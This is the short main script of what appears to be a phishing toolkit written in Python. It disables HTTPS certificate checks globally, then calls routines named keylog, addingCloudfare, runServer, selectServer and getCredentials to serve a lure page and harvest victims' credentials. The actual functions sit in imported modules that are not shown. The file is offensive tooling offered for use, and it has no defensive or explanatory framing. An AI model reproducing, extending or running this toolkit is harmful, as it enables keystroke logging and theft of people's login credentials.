#!/usr/bin/python3
import multiprocessing
import gettext
from os import system,environ
import sys
import ssl
if(not environ.get('PYTHONHTTPSVERIFY',"") and getattr(ssl,'_create_unverified_context',None)):
    ssl._create_default_https_context=ssl._create_unverified_context
    
from Defs.Checks import *
from Defs.Configurations import *
from Defs.Actions import *
from Defs.Languages import *


RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'
checkPermissions()
installGetText()
languageSelector()
cres()
ifSettingsNotExists()
readConfig()


if __name__ == "__main__":
    try:
        runMainMenu()
        mainMenu()
        keylog()
        addingCloudfare()
        inputCustom()
        port=selectPort()
        runServer(port)
        selectServer(port)
        multiprocessing.Process(target=runServer, args=(port,)).start()
        getCredentials(port)
    except KeyboardInterrupt:
        endMessage()
        exit(0)
